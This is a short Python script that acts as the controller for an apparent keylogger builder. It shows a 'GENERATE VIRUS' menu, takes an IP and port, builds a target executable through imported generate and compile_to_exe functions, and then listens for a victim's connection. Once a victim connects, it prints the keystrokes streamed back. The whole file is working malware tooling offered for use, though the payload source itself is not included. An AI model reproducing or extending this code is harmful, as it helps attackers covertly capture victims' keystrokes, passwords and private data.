import socket 
import os 
from colorama import Fore, Back 
from banner import banner, generate, compile_to_exe

os.system("clear")
print(Fore.RED + banner)

menu = Fore.GREEN + """
########################################################
#                     How to use?                      #
#                 #################                    #
#                     I| ENTER IP                      #
#                    II| ENTER PORT                    #
#                   III| GENERATE VIRUS                #
########################################################
"""

print(menu)

ip = str(input(Fore.YELLOW + "#IP: "))
port = int(input(Fore.YELLOW + "#PORT: "))

if ip == " " or port == None:
    exit()

s = socket.socket()

try: 
    s.bind((ip,port))
    print(Fore.GREEN + "###########SERVER BINDED###########")
except:
    print(Fore.GREEN + "###########SOMETHING WRONG!###########")
s.listen()

print(Fore.GREEN + "\n#GENERATING TARGET FILE...")
generate(ip,port)
compile_to_exe()
if generate:
    print(Fore.GREEN + "#GENERATED!")
else:
    print(Fore.RED + "ERROR!")
    
print(Fore.CYAN + "#WAINTING CONNECTION")
conn, addr = s.accept()

if s.accept:
    print("#Connection with target established#")

run = True 

while run:
    try:
        key = conn.recv(1024)
        key = key.decode()
    except:
        continue

    os.system("cls")
    print(key, sep=' ', end='', flush=True)
